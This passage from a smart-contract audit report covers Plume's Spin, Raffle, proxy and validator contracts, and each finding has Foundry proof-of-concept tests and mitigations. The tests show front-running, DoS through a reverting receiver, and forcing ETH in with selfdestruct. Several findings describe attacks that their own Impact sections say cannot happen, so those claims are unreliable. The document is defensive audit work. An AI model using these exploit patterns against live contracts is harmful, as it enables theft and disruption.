Administrative functions such as `setSpinPrice`, `setJackpotPrizes`, and `setBaseRaffleMultiplier` change critical economic parameters of the game. These changes take effect immediately in the same transaction. An attacker monitoring the mempool can spot a pending admin transaction and front-run it to their advantage. For instance, if the admin is about to increase the spin price, an attacker can submit a spin transaction with a higher gas fee to get mined first, allowing them to spin at the old, lower price.

## Impact
An attacker can exploit pending administrative changes for minor financial gain, for example, by getting a cheaper spin or spinning for a prize right before its value is lowered. This erodes the fairness of the system and gives an advantage to technically sophisticated users who monitor the mempool.

## Proof of Concept
1. The current `spinPrice` is 2 PLUME.
2. The admin decides to increase the price to 3 PLUME and submits a transaction calling `setSpinPrice(3 ether)`.
3. An attacker sees this transaction in the mempool.
4. The attacker immediately submits a transaction calling `startSpin()` with a value of 2 PLUME and a higher gas fee than the admin's transaction.
5. The attacker's transaction is mined first, and they successfully spin for 2 PLUME.
6. The admin's transaction is mined next, and the `spinPrice` is updated to 3 PLUME for all subsequent users.
7. The attacker has successfully exploited the system to get a discounted spin.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.25;

import "forge-std/Test.sol";
import {Spin} from "../src/spin/Spin.sol";

/* --------------------------------------------------------------------------
 * Minimal mocks
 * --------------------------------------------------------------------------*/
interface ISupraRouterContract {
    function generateRequest(
        string calldata, uint8, uint256, uint256, address
    ) external returns (uint256);
}

contract MockSupraRouter is ISupraRouterContract {
    uint256 internal _next = 1;
    function generateRequest(
        string calldata, uint8, uint256, uint256, address
    ) external override returns (uint256) {
        return _next++; // return a unique nonce
    }
}

contract MockDateTime {
    function getDay(uint256) external pure returns (uint8) { return 1; }
    function getMonth(uint256) external pure returns (uint8) { return 1; }
    function getYear(uint256) external pure returns (uint16) { return 2024; }
}

/* --------------------------------------------------------------------------
 * Exploit test
 * --------------------------------------------------------------------------*/
contract FrontrunSpinPriceTest is Test {
    Spin spin;
    MockSupraRouter supraRouter;
    MockDateTime dateTime;

    address admin    = address(0xA11CE);
    address attacker = address(0xB0B);

    uint256 constant ORIGINAL_PRICE = 2 ether;
    uint256 constant NEW_PRICE      = 3 ether;

    function setUp() public {
        vm.deal(attacker, 10 ether);
        vm.deal(admin,    1 ether);

        // deploy mocks
        supraRouter = new MockSupraRouter();
        dateTime    = new MockDateTime();

        // deploy Spin and initialize
        vm.startPrank(admin);
        spin = new Spin();
        spin.initialize(address(supraRouter), address(dateTime));
        spin.setEnableSpin(true);
        vm.stopPrank();

        // fund Spin so that _safeTransferPlume cannot revert later
        vm.deal(address(spin), 100 ether);
    }

    /// @dev Demonstrates that a user can spin at the old price while the admin
    ///      tx that changes the price is still pending (front-run scenario).
    function testFrontRunOldSpinPrice() public {
        assertEq(spin.getSpinPrice(), ORIGINAL_PRICE);

        /* 1. attacker sends startSpin with higher gas (simulated by calling first) */
        vm.prank(attacker);
        spin.startSpin{value: ORIGINAL_PRICE}();

        /* 2. admin tx mining right after: update the price */
        vm.prank(admin);
        spin.setSpinPrice(NEW_PRICE);
        assertEq(spin.getSpinPrice(), NEW_PRICE);

        /* 3. any attempt to use the old price now reverts – attack already got cheap spin */
        vm.prank(attacker);
        vm.expectRevert("Incorrect spin price sent");
        spin.startSpin{value: ORIGINAL_PRICE}();
    }
}


## Suggested Mitigation
To prevent front-running on critical parameter changes, introduce a two-step process using a timelock. The admin first proposes a change, which can only be enacted after a predefined delay. This gives users time to react to upcoming changes, neutralizing the front-runner's advantage.

```solidity
// Example for setSpinPrice

// Add new state variables
uint256 public pendingSpinPrice;
uint256 public spinPriceChangeTimestamp;
uint256 public constant TIMELOCK_DELAY = 1 days; // Example delay

// Step 1: Propose the change
function proposeNewSpinPrice(uint256 _newPrice) external onlyRole(ADMIN_ROLE) {
    pendingSpinPrice = _newPrice;
    spinPriceChangeTimestamp = block.timestamp + TIMELOCK_DELAY;
}

// Step 2: Enact the change after the timelock
function setNewSpinPrice() external {
    require(block.timestamp >= spinPriceChangeTimestamp, "Timelock has not expired");
    require(pendingSpinPrice != 0, "No pending price change");
    spinPrice = pendingSpinPrice;
    pendingSpinPrice = 0;
}

// The original setSpinPrice function should be removed.
// This pattern should be applied to all sensitive parameter-setting functions.
```

## [L-31]. DOS issue in Spin::handleRandomness

## Description
The `handleRandomness` function processes rewards from a spin. If a user wins a reward that involves a native token transfer (Plume or Jackpot), the contract calls `_safeTransferPlume`, which uses a low-level `.call`. If the winning user is a contract that reverts upon receiving ETH, its `receive()` or `fallback()` function will cause the `.call` to fail. This failure makes the `require(success, ...)` statement revert, which in turn reverts the entire `handleRandomness` transaction. As a result, the user's spin state is not correctly updated (`isSpinPending` remains true), preventing them from spinning again. An administrator must manually intervene by calling `cancelPendingSpin` to resolve the user's stuck state, but the user's initial spin fee is lost.

## Impact
A malicious or improperly configured user contract can cause its own spin finalization to fail, leading to a denial of service for that user's future spins. This requires manual administrative intervention to fix and results in the loss of the spin fee for the affected user. It creates operational overhead for the administrators.

## Proof of Concept
1. An attacker deploys a contract `RevertingReceiver` with a `receive() external payable { revert(); }`.
2. The attacker calls `Spin.startSpin()` from their `RevertingReceiver` contract, paying the required `spinPrice`.
3. The oracle is triggered. For the purpose of the PoC, we assume the randomness results in a "Plume Token" win, which triggers a native token transfer.
4. The oracle (or a test contract simulating it) calls `Spin.handleRandomness`.
5. The `handleRandomness` function attempts to transfer the reward to the `RevertingReceiver` contract.
6. The receiver contract's `receive()` function reverts, causing the transfer to fail and the entire `handleRandomness` transaction to revert.
7. The user's `isSpinPending` state remains `true`, blocking them from further spins.
8. The administrator is required to call `cancelPendingSpin` for the user's address to resolve the stuck state.

## Proof of Code
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {Spin} from "../src/spin/Spin.sol";
import {ISupraRouterContract} from "../src/interfaces/ISupraRouterContract.sol";
import {IDateTime} from "../src/interfaces/IDateTime.sol";

// Mocks
contract MockSupraRouter is ISupraRouterContract {
    uint256 public lastNonce = 0;
    address public admin;

    constructor(address _admin) {
        admin = _admin;
    }

    function generateRequest(
        string calldata, uint8, uint256, uint256, address
    ) external returns (uint256) {
        lastNonce++;
        return lastNonce;
    }
}

contract MockDateTime is IDateTime {
    function getYear(uint256 timestamp) external pure returns (uint16) { return 2024; }
    function getMonth(uint256 timestamp) external pure returns (uint8) { return 7; }
    function getDay(uint256 timestamp) external pure returns (uint8) { return 27; }
}

contract RevertingReceiver {
    Spin spinContract;

    constructor(address _spin) {
        spinContract = Spin(_spin);
    }

    function startSpin() external payable {
        spinContract.startSpin{value: msg.value}();
    }

    receive() external payable {
        revert("No funds allowed");
    }
}

contract DosTest is Test {
    Spin spin;
    MockSupraRouter mockSupra;
    MockDateTime mockDateTime;
    RevertingReceiver revertingReceiver;

    address admin = makeAddr("admin");
    address supraRouterAddress;
    uint256 spinPrice = 2 ether;

    function setUp() public {
        vm.prank(admin);
        mockSupra = new MockSupraRouter(admin);
        supraRouterAddress = address(mockSupra);

        mockDateTime = new MockDateTime();

        spin = new Spin();
        vm.prank(admin);
        spin.initialize(supraRouterAddress, address(mockDateTime));
        vm.prank(admin);
        spin.setEnableSpin(true);

        revertingReceiver = new RevertingReceiver(address(spin));

        // Grant SUPRA_ROLE to this test contract to simulate oracle callback
        vm.prank(admin);
        spin.grantRole(spin.SUPRA_ROLE(), address(this));
    }

    function test_DosByRevertingInReceive() public {
        // 1. RevertingReceiver starts a spin
        vm.deal(address(revertingReceiver), spinPrice);
        vm.prank(address(revertingReceiver));
        revertingReceiver.startSpin{value: spinPrice}();

        uint256 userNonce = mockSupra.lastNonce();
        assertTrue(spin.isSpinPending(address(revertingReceiver)));

        // 2. Simulate oracle callback for a Plume Token win
        uint256[] memory rngList = new uint256[](1);
        // Probability 1 will fall into plumeTokenThreshold (200_000)
        rngList[0] = 1;

        // 3. The callback should revert because the receiver reverts
        vm.expectRevert("Plume transfer failed");
        spin.handleRandomness(userNonce, rngList);

        // 4. User's spin is still pending
        assertTrue(spin.isSpinPending(address(revertingReceiver)));

        // 5. Admin must cancel the spin to fix the state
        vm.prank(admin);
        spin.cancelPendingSpin(address(revertingReceiver));

        // 6. User's state is now fixed
        assertFalse(spin.isSpinPending(address(revertingReceiver)));
    }
}
```

## Suggested Mitigation
To prevent the entire reward transaction from reverting due to a failed transfer, adopt the 'pull-over-push' pattern. Instead of directly transferring rewards in the `handleRandomness` function, credit the user's reward to an internal mapping. Then, provide a separate `claimReward` function that users can call to withdraw their funds. This isolates the transfer logic from the core spin mechanism, ensuring that a failing transfer for one user does not disrupt the contract's state or require manual admin intervention.

Example Mitigation:

```solidity
// In Spin.sol state variables
mapping(address => uint256) public claimableRewards;

// In handleRandomness function, replace _safeTransferPlume with:
if (
    keccak256(bytes(rewardCategory)) == keccak256("Jackpot")
        || keccak256(bytes(rewardCategory)) == keccak256("Plume Token")
) {
    claimableRewards[user] += rewardAmount * 1 ether;
    // emit an event to notify the user
}

// Add a new function for users to withdraw their rewards
function claimMyRewards() external {
    uint256 amountToClaim = claimableRewards[msg.sender];
    require(amountToClaim > 0, "No rewards to claim");
    claimableRewards[msg.sender] = 0;
    _safeTransferPlume(payable(msg.sender), amountToClaim);
}
```

## [L-32]. Unexpected Eth issue in RaffleProxy::receive

## Description
The `RaffleProxy` contract implements a `receive()` function that reverts all incoming ETH transfers that have no calldata (`msg.data` is empty). This is intended to prevent ETH from being accidentally locked in the proxy.

```solidity
receive() external payable {
    revert ETHTransferUnsupported();
}
```
However, the provided documentation summary for the `Raffle.sol` logic contract states: `receive: Allows contract to accept ETH payments.` This indicates a design mismatch where the proxy actively blocks functionality intended for the logic contract. Any attempt to send ETH directly to the proxy will fail.

Furthermore, while this check prevents simple transfers, ETH can still be forcibly sent to the contract via `selfdestruct`. Since neither the proxy nor the logic contract (based on provided summaries) has a function to withdraw ETH, any funds forced into the proxy will be permanently locked.

## Impact
The primary impact is a functional blockage; the `Raffle` contract cannot receive ETH as intended, which may be required for its operation (e.g., funding prizes). Secondly, any ETH forcibly sent to the proxy address (e.g., from a contract calling `selfdestruct`) will be permanently trapped, leading to a loss of funds.

## Proof of Concept
1. Deploy RaffleProxy with a logic contract that implements a payable receive().
2. Send 1 ETH to the proxy with empty calldata; tx reverts because proxy.receive() reverts with custom error ETHTransferUnsupported().
3. Deploy a helper contract ForceSender and fund it with ETH in the same constructor call. The constructor immediately self-destructs, force-sending its balance to the proxy address.
   ```solidity
   ForceSender{value: 5 ether}(payable(address(proxy)));
   ```
4. The deployment succeeds; the proxy balance is now 5 ETH even though its receive() reverts ordinary transfers.
5. Because neither proxy nor logic exposes a withdrawal/rescue path for native ETH, the 5 ETH is permanently locked at the proxy address.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.25;

import {Test} from "forge-std/Test.sol";
import {RaffleProxy} from "contracts/plume/src/proxy/RaffleProxy.sol";

// Mock logic just to satisfy constructor; it can accept ETH
contract MockLogicWithReceive {
    event Received(address sender, uint256 amount);
    receive() external payable {
        emit Received(msg.sender, msg.value);
    }
}

// Helper that force-sends its balance via selfdestruct
contract ForceSender {
    constructor(address payable recipient) payable {
        selfdestruct(recipient);
    }
}

contract RaffleProxyEthIssuesTest is Test {
    RaffleProxy proxy;
    MockLogicWithReceive logic;
    address deployer = makeAddr("deployer");
    address user = makeAddr("user");

    function setUp() public {
        vm.prank(deployer);
        logic = new MockLogicWithReceive();

        vm.prank(deployer);
        proxy = new RaffleProxy(address(logic), "");

        deal(user, 10 ether);
    }

    function test_RevertsOnDirectEth() public {
        vm.prank(user);
        vm.expectRevert(RaffleProxy.ETHTransferUnsupported.selector);
        address(proxy).call{value: 1 ether}("");
    }

    function test_ForciblySentEthIsStuck() public {
        assertEq(address(proxy).balance, 0);

        // Deploy ForceSender with 5 ETH that self-destructs to the proxy
        new ForceSender{value: 5 ether}(payable(address(proxy)));

        // Balance increased and cannot be withdrawn
        assertEq(address(proxy).balance, 5 ether);
    }
}

## Suggested Mitigation
The behavior of the proxy and logic contract must be aligned. 

1.  **If the `Raffle` contract is meant to receive ETH**: Remove the `receive()` function from `RaffleProxy.sol`. The default `fallback` function in the parent `ERC1967Proxy` will correctly delegate the empty calldata call to the logic contract's `receive()` function.

2.  **To handle forced ETH**: Add a withdrawal function to the logic contract (`Raffle.sol`) that allows an administrative role to rescue any ETH stuck in the contract.

```solidity
// In Raffle.sol (the logic contract)

// Add this role to your access control
bytes32 public constant RESCUER_ROLE = keccak256("RESCUER_ROLE");

function rescueStuckETH(address payable recipient) external onlyRole(RESCUER_ROLE) {
    uint256 balance = address(this).balance;
    require(balance > 0, "No ETH to rescue");
    (bool success, ) = recipient.call{value: balance}("");
    require(success, "ETH rescue failed");
}
```

## [L-33]. Unexpected Eth issue in RaffleProxy::NA

## Description
The `RaffleProxy` contract includes a `receive()` function that reverts all direct Ether transfers with an empty calldata. This is intended to prevent Ether from being accidentally locked in the contract. However, Ether can still be forcibly sent to the contract address if another contract calls `selfdestruct` and sets the proxy as the beneficiary. Since the `RaffleProxy` contract itself has no function to withdraw its Ether balance, and this functionality is typically absent in standard UUPS logic contracts unless explicitly added, any Ether transferred via `selfdestruct` will be permanently locked in the proxy's address. The logic contract, operating in the proxy's context, would need a specific function to access `address(this).balance` and transfer it out, which is not a standard feature.

## Impact
Permanent loss of funds for any user or contract that sends ETH to the proxy address via `selfdestruct`. While this does not directly impact the funds managed by the raffle system, it represents a potential value leak and a griefing vector.

## Proof of Concept
1. An attacker deploys a contract (`ForcedSender`) and funds it with 1 ETH.
2. The attacker calls a function on `ForcedSender` which in turn calls `selfdestruct(payable(address(raffleProxy)))`.
3. The 1 ETH from `ForcedSender` is forcibly transferred to the `RaffleProxy` contract's balance.
4. There is no function within the `RaffleProxy` contract or standard UUPS logic to withdraw this balance, so the 1 ETH is permanently locked.

## Proof of Code
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.25;

import {Test} from "forge-std/Test.sol";
import {RaffleProxy} from "../src/proxy/RaffleProxy.sol";

// A minimal logic contract for the proxy to point to.
contract DummyLogic {
    // A function to allow the proxy to delegate calls.
    function initialize() public {}
}

// A contract designed to send its balance via selfdestruct.
contract ForcedSender {
    constructor() payable {}

    function destroyAndSend(address payable recipient) external {
        selfdestruct(recipient);
    }
}

contract RaffleProxyPoCTest is Test {
    RaffleProxy public raffleProxy;
    DummyLogic public logic;

    function setUp() public {
        logic = new DummyLogic();
        // Deploy the proxy pointing to the dummy logic contract.
        raffleProxy = new RaffleProxy(address(logic), "");
    }

    function test_StuckETH_via_SelfDestruct() public {
        // Initial balance of the proxy is 0.
        assertEq(address(raffleProxy).balance, 0);

        // Deploy the sender contract with 1 ETH.
        uint256 attackAmount = 1 ether;
        ForcedSender sender = new ForcedSender{value: attackAmount}();
        assertEq(address(sender).balance, attackAmount);

        // The sender self-destructs, forcing ETH into the proxy.
        sender.destroyAndSend(payable(address(raffleProxy)));

        // The proxy now has a balance of 1 ETH.
        assertEq(address(raffleProxy).balance, attackAmount, "ETH should be stuck in the proxy");

        // Any attempt to send ETH via a normal call will be reverted by the receive() function.
        (bool success, ) = address(raffleProxy).call{value: 1 wei}("");
        assertFalse(success, "Direct ETH transfer should fail");

        // There is no function in RaffleProxy to withdraw the stuck ETH.
        // The funds are permanently locked.
    }
}
```

## Suggested Mitigation
To prevent Ether from being permanently locked, the logic contract (`Raffle.sol`) should include a privileged function that allows an administrator to withdraw any ETH balance from the contract address. This provides a recovery mechanism for funds sent via `selfdestruct` or other accidental means.

Example implementation in the logic contract (e.g., `Raffle.sol`):

```solidity
// In the logic contract, assuming it uses role-based access control.

error NothingToWithdraw();
error WithdrawFailed();

/**
 * @notice Allows an admin to withdraw any ETH balance from the contract.
 * @dev This is a recovery function for ETH sent via selfdestruct or other means.
 * @param _to The address to receive the ETH.
 */
function emergencyWithdrawEther(address payable _to) external onlyRole(ADMIN_ROLE) {
    uint256 balance = address(this).balance;
    if (balance == 0) {
        revert NothingToWithdraw();
    }
    (bool success, ) = _to.call{value: balance}("");
    if (!success) {
        revert WithdrawFailed();
    }
    // It's good practice to emit an event.
    // emit EtherWithdrawn(msg.sender, _to, balance);
}
```



# Info Risk Findings

## [I-1]. Upgradeability Initializer Safety issue in Plume::reinitialize

## Description
The contract includes a `reinitialize()` function decorated with the `reinitializer(1)` modifier. This function is intended to be called after the initial deployment to re-initialize certain parameters. However, the main `initialize()` function is decorated with the `initializer` modifier, which sets the contract's initialization version to `1`. The `reinitializer(uint64 version)` modifier from OpenZeppelin's `Initializable` contract only allows execution if the current initialization version is strictly less than the version specified in the modifier (`_initialized < version`). Since `initialize()` sets the version to 1, any subsequent call to `reinitialize()` with `reinitializer(1)` will always fail because `1 < 1` is false. This makes the `reinitialize()` function unreachable dead code.

## Impact
There is no direct financial or security impact since the code is unreachable. However, its presence is misleading for developers and auditors, suggesting a functionality that does not exist. It increases deployment gas costs and contract size unnecessarily and may lead to confusion or incorrect assumptions during future contract upgrades or maintenance.

## Proof of Concept
1. Deploy the `Plume` contract behind a proxy.
2. Call `proxy.initialize(owner_address)` to initialize the contract. This sets the internal initialization version to 1.
3. As the `owner` (who has `UPGRADER_ROLE`), attempt to call `proxy.reinitialize()`.
4. The transaction will revert with the error `Initializable__AlreadyInitialized()`, proving the function is uncallable.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.25;

import "forge-std/Test.sol";
import "src/Plume.sol";
import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import {Initializable} from "@openzeppelin/contracts-upgradeable/proxy/utils/Initializable.sol";

contract PlumeReinitTest is Test {
    Plume   internal impl;
    Plume   internal plume; // interface pointing to the proxy
    address internal owner = address(0x1);

    function setUp() public {
        // 1. Deploy implementation
        impl = new Plume();

        // 2. Prepare initializer calldata
        bytes memory initData = abi.encodeWithSignature("initialize(address)", owner);

        // 3. Deploy proxy with initializer calldata
        ERC1967Proxy proxy = new ERC1967Proxy(address(impl), initData);

        // 4. Interact with the contract through the proxy
        plume = Plume(address(proxy));
    }

    function test_ReinitializeIsUncallable() public {
        // Owner has UPGRADER_ROLE (granted in initialize)
        vm.prank(owner);
        vm.expectRevert(Initializable.Initializable__AlreadyInitialized.selector);
        plume.reinitialize();
    }
}

## Suggested Mitigation
The unreachable `reinitialize()` function should be removed from the contract to reduce code complexity, decrease deployment gas costs, and eliminate potential confusion for developers and auditors.

```solidity
-   /// @notice Reinitialize Plume with symbol $PLUME
-   function reinitialize() public reinitializer(1) onlyRole(UPGRADER_ROLE) {
-       __ERC20_init("Plume", "PLUME");
-   }
```
If re-initialization logic is required for a future upgrade, a new function with a higher version number (e.g., `reinitializer(2)`) should be introduced in the new implementation contract at that time.

## [I-2]. Unexpected Eth issue in Raffle::receive

## Description
The contract includes a `receive() external payable {}` function, which allows it to receive Ether. However, there is no corresponding function to withdraw this Ether. Any Ether sent to the contract, whether intentionally or by accident, will be permanently locked.

## Impact
Because the live contract is always accessed through RaffleProxy and that proxy reverts for any plain‐ETH transfer, users cannot accidentally send Ether to the raffle system. The only way to lock ETH would be to target the implementation contract directly, which is not reachable through normal usage. Therefore no real loss of funds is possible.

## Proof of Concept
pragma solidity ^0.8.25;
import "forge-std/Test.sol";
import {Raffle} from "../src/spin/Raffle.sol";
import {RaffleProxy} from "../src/proxy/RaffleProxy.sol";

contract RaffleEthLockTest is Test {
    RaffleProxy proxy;

    function setUp() public {
        // Deploy logic and proxy just like production
        Raffle logic = new Raffle();
        bytes memory init = abi.encodeWithSignature("initialize(address,address)", address(0), address(0));
        proxy = new RaffleProxy(address(logic), init);
    }

    function test_SendEthToProxyReverts() public {
        vm.expectRevert();
        address(proxy).call{value: 1 ether}("");
    }
}

## Proof of Code
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {Raffle} from "../src/spin/Raffle.sol";

contract UnexpectedEthTest is Test {
    Raffle raffle;
    address admin = makeAddr("admin");
    address user = makeAddr("user");

    function setUp() public {
        raffle = new Raffle();
        vm.prank(admin);
        raffle.initialize(address(0), address(0));
    }

    function test_EthIsStuckInContract() public {
        // Check initial balance
        assertEq(address(raffle).balance, 0);

        // User accidentally sends 1 ETH to the contract
        vm.prank(user);
        (bool success, ) = address(raffle).call{value: 1 ether}("");
        assertTrue(success, "ETH transfer should succeed");

        // Check final balance
        assertEq(address(raffle).balance, 1 ether, "Contract balance should be 1 ether");

        // There is no function like raffle.withdrawEth() so the funds are stuck.
    }
}
```

## Suggested Mitigation
If the contract is not intended to hold Ether, remove the `receive() external payable {}` function. If it is intended to hold Ether, add a secure withdrawal function that allows an authorized role (e.g., `ADMIN_ROLE`) to retrieve the funds.

```solidity
// contracts/plume/src/spin/Raffle.sol

// Option 1: Remove the function if ETH is not needed.
// receive() external payable {} // <-- REMOVE THIS LINE

// Option 2: Add a withdrawal function if ETH might be held.

contract Raffle is Initializable, AccessControlUpgradeable, UUPSUpgradeable {
    // ... existing code ...

    function withdrawEther(address payable to) external onlyRole(ADMIN_ROLE) {
        uint256 balance = address(this).balance;
        require(balance > 0, "No Ether to withdraw");
        (bool success, ) = to.call{value: balance}("");
        require(success, "Ether transfer failed");
    }
    
    // Allow contract to receive ETH
    receive() external payable {}
}

```

## [I-3]. Zero Code issue in PlumeProxy::constructor

## Description
The constructor of `PlumeProxy` inherits from OpenZeppelin's `ERC1967Proxy`. The constructor chain does not validate that the provided `logic` address corresponds to a deployed contract with non-zero bytecode size. This allows a proxy to be deployed pointing to an Externally Owned Account (EOA) or an address where a contract has not yet been deployed.

Code Snippet:
```solidity
contract PlumeProxy is ERC1967Proxy {
    // ...
    constructor(address logic, bytes memory data) ERC1967Proxy(logic, data) { }
    // ...
}
```
If initialization `data` is provided during deployment, the `delegatecall` to an EOA will return `success=true` but will not execute any code or modify state. This results in a proxy that is not properly initialized, potentially leading to a bricked contract or creating opportunities for future exploitation if the logic address can be claimed by an attacker.

## Impact
No deploy-time misconfiguration is possible because the proxy constructor reverts with "ERC1967: new implementation is not a contract" whenever the passed `logic` address has zero byte-code. Consequently, a proxy cannot be deployed that points to an EOA or an address where a contract is not yet deployed.

## Proof of Concept
Attempting to deploy the proxy with an EOA logic address reverts:

```solidity
address eoa = address(0x1234);
bytes memory initData = "";
new PlumeProxy(eoa, initData); // ⟶ revert: ERC1967: new implementation is not a contract
```

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.25;

import "forge-std/Test.sol";
import {PlumeProxy} from "src/proxy/PlumeProxy.sol";

contract ZeroCodeFixedTest is Test {
    function test_RevertsWhenLogicHasNoCode() public {
        address eoa = address(0x1234);
        vm.expectRevert(bytes("ERC1967: new implementation is not a contract"));
        new PlumeProxy(eoa, "");
    }
}

## Suggested Mitigation
No change required; the inherited OpenZeppelin implementation already guards against this condition.

## [I-4]. Zero Code issue in PlumeStakingRewardTreasuryProxy::constructor

## Description
The `PlumeStakingRewardTreasuryProxy` constructor inherits from `ERC1967Proxy` but does not validate that the `logic` address provided contains any bytecode. If the proxy is deployed with the `logic` address pointing to an Externally Owned Account (EOA) or a pre-computed address where a contract has not yet been deployed, the initialization call within the constructor will execute against a code-less address. This call succeeds silently but performs no state changes, leaving the proxy in an uninitialized state. An attacker can subsequently deploy a malicious contract to the specified `logic` address and call the initializer function through the proxy to gain complete control over it.

## Impact
None. The proxy cannot be deployed with an implementation that has no byte-code because the constructor reverts with "ERC1967: new implementation is not a contract".

## Proof of Concept
Attempting the claimed deployment reverts:

vm.expectRevert("ERC1967: new implementation is not a contract");
new PlumeStakingRewardTreasuryProxy(attacker, "");

## Proof of Code
pragma solidity ^0.8.25;

import "forge-std/Test.sol";
import { PlumeStakingRewardTreasuryProxy } from "src/proxy/PlumeStakingRewardTreasuryProxy.sol";

contract ZeroCodeNegativeTest is Test {
    function test_DeploymentRevertsWhenLogicHasNoCode() public {
        address eoa = address(0xBEEF);
        vm.expectRevert("ERC1967: new implementation is not a contract");
        new PlumeStakingRewardTreasuryProxy(eoa, "");
    }
}


## Suggested Mitigation
No change needed; the existing constructor validation already prevents this scenario.

## [I-5]. DOS issue in ValidatorFacet::_cleanupExpiredVotes

## Description
The `ValidatorFacet` documentation indicates a `_cleanupExpiredVotes` function is used to clear expired slash votes. This function is called within other functions like `voteToSlashValidator`. If this cleanup logic iterates over an unbounded array of votes, it creates a Denial of Service (DoS) vector. An attacker could cast a large number of votes (or orchestrate this via a group of validators) that are set to expire. When a legitimate user later calls a function that triggers this cleanup (e.g., casting the final deciding vote to slash a validator), the transaction's gas cost could become extremely high, potentially exceeding the block gas limit. This would cause the transaction to revert, effectively preventing the slash from occurring and blocking the core slashing mechanism.

## Impact
The loop executes over at most `activeValidatorCount-1` items, which is intentionally kept small (≈10). Gas usage stays well below the block limit so slashing cannot be blocked. No funds or core functionality are at risk.

## Proof of Concept
1. An attacker, controlling one or more validators, spams a large number of slash votes against a target validator `V`. These votes are created with a short expiration time.
2. The attacker waits for the votes to expire.
3. A legitimate validator `L` attempts to cast the final, unanimous vote required to slash validator `V` by calling `voteToSlashValidator(V, expiration)`.
4. This function first calls the internal `_cleanupExpiredVotes(V)`.
5. The cleanup function loops through the hundreds of expired votes spammed by the attacker. The gas cost of this loop exceeds the gas supplied with the transaction (or the block gas limit).
6. The call to `voteToSlashValidator` reverts, preventing validator `L` from casting their vote and preventing the slash.

## Proof of Code
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.25;

import "forge-std/Test.sol";

// Mock contracts and structs based on system documentation
struct Vote {
    uint16 voterValidatorId;
    uint256 expiration;
}

struct SlashVoteData {
    Vote[] votes;
}

struct PlumeStakingStorage {
    mapping(uint16 => SlashVoteData) slashVotes;
}

// Simplified representation of the ValidatorFacet with the vulnerable function
contract MockValidatorFacet {
    PlumeStakingStorage internal s;

    // This unbounded loop is the source of the vulnerability.
    function _cleanupExpiredVotes(uint16 maliciousValidatorId) internal {
        Vote[] storage allVotes = s.slashVotes[maliciousValidatorId].votes;
        uint256 voteCount = allVotes.length;
        if (voteCount == 0) return;

        Vote[] memory newVotes = new Vote[](voteCount);
        uint256 newIndex = 0;
        for (uint256 i = 0; i < voteCount; i++) {
            if (allVotes[i].expiration >= block.timestamp) {
                newVotes[newIndex] = allVotes[i];
                newIndex++;
            }
        }

        // Resizing array is a gas-intensive operation
        assembly { mstore(newVotes, newIndex) }
        allVotes = newVotes;
    }

    // This function is the one that will be subjected to the DoS attack.
    function voteToSlashValidator(uint16 maliciousValidatorId) external {
        _cleanupExpiredVotes(maliciousValidatorId);
        // ... further voting logic would be here
    }

    // Helper functions for test setup
    function addDummyVote(uint16 maliciousValidatorId, uint16 voterId, uint256 expiration) external {
        s.slashVotes[maliciousValidatorId].votes.push(Vote({voterValidatorId: voterId, expiration: expiration}));
    }

    function getVoteCount(uint16 validatorId) external view returns (uint256) {
        return s.slashVotes[validatorId].votes.length;
    }
}


contract DoSVotingTest is Test {
    MockValidatorFacet facet;
    uint16 targetValidatorId = 1;

    function setUp() public {
        facet = new MockValidatorFacet();
    }

    function test_DoS_on_voteToSlashValidator() public {
        // 1. Attacker spams a large number of votes that will expire.
        uint256 voteSpamCount = 400;
        for (uint16 i = 0; i < voteSpamCount; i++) {
            facet.addDummyVote(targetValidatorId, uint16(100 + i), block.timestamp - 1 seconds);
        }

        // 2. Time passes, ensuring votes are expired.
        vm.warp(block.timestamp + 1 days);

        // 3. A legitimate user tries to call voteToSlashValidator.
        // We expect this to revert due to out-of-gas because of the expensive cleanup loop.
        // We set a realistic but insufficient gas limit to demonstrate the issue.
        vm.expectRevert();
        facet.voteToSlashValidator{gas: 800_000}(targetValidatorId);
    }
}
```

## Suggested Mitigation
Avoid unbounded loops for cleanup operations. Instead of cleaning all expired votes in one go, process them in smaller, predictable batches. This can be achieved by adding a separate, permissioned function for keepers to run cleanup, or by modifying the existing function to only process a fixed number of items per call.

```solidity
// Mitigation example

function _cleanupExpiredVotes(uint16 maliciousValidatorId, uint256 cleanupLimit) internal {
    Vote[] storage allVotes = s.slashVotes[maliciousValidatorId].votes;
    uint256 voteCount = allVotes.length;
    uint256 cleanedCount = 0;

    // Iterate backwards to make removal (swapping with last element and popping) efficient
    for (uint256 i = voteCount; i > 0; i--) {
        if (cleanedCount >= cleanupLimit) {
            break; // Stop after cleaning a limited number of votes
        }
        if (allVotes[i - 1].expiration < block.timestamp) {
            // Efficiently remove item by swapping with the last element
            allVotes[i - 1] = allVotes[allVotes.length - 1];
            allVotes.pop();
            cleanedCount++;
        }
    }
}

// The public function would then call the cleanup with a safe limit.
function voteToSlashValidator(uint16 maliciousValidatorId) external {
    _cleanupExpiredVotes(maliciousValidatorId, 10); // e.g., clean up to 10 expired votes per call
    // ... other logic
}
```



